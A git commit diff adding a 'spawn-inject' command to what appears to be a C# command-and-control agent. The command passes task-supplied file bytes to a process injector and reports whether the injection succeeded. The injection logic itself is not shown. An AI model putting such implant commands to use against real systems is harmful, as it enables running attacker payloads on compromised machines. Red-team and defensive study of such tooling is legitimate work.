21f3f94efb13ca16bd60b2583948793c29a39520
WG37 <willg2070@gmail.com>
2025-12-23 13:52:11 +1100

    feat(): add spawnInject command

---
+++ Agent/Application/Commands/SpawnInject.cs
@@ -0,0 +1,30 @@
+﻿using AgentClient.Application.Services.InjectService;
+using AgentClient.Domain.Models.Agents;
+
+namespace AgentClient.Application.Commands
+{
+    public class SpawnInject : AgentCommand
+    {
+        public override string Name => "spawn-inject";
+
+        public override string Execute(AgentTask task)
+        {
+            if (task.FileBytes == null)
+            {
+                return "FileBytes cannot be null";
+            }
+
+            var injector = new SpawnInjector();
+            var success = injector.Inject(task.FileBytes);
+
+            if (success)
+            {
+                return "Successful Injection";
+            }
+            else
+            {
+                return "Injection Failed";
+            }
+        }
+    }
+}
